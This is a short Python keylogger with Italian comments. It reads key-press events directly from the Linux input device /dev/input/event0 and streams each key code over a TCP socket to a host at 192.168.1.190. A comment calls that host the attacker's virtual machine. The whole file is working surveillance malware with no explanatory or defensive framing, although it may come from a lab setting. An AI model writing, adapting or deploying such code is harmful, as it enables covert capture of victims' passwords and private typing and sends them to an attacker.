import socket
import ctypes
import ctypes.util
import sys

# Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
SERVER_IP = '192.168.1.190'
SERVER_PORT = 1235

# Crea la connessione socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER_IP, SERVER_PORT))

# Definizioni ctypes
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Definizioni di strutture e costanti
class InputEvent(ctypes.Structure):
    _fields_ = [("time", ctypes.c_long * 2),
                ("type", ctypes.c_uint16),
                ("code", ctypes.c_uint16),
                ("value", ctypes.c_int32)]

EV_KEY = 0x01
input_device = "/dev/input/event0"  # Assicurati che questo sia il dispositivo corretto

# Apri il dispositivo di input
fd = libc.open(input_device.encode('utf-8'), 0)
if fd < 0:
    print("Impossibile aprire il dispositivo di input")
    sys.exit(1)

event = InputEvent()
while True:
    # Leggi un evento dal dispositivo di input
    bytes_read = libc.read(fd, ctypes.byref(event), ctypes.sizeof(event))
    if bytes_read > 0 and event.type == EV_KEY and event.value == 1:
        # Invio il tasto premuto al server
        sock.sendall(str(event.code).encode('utf-8'))

# Chiude la connessione socket quando il listener si interrompe
sock.close()
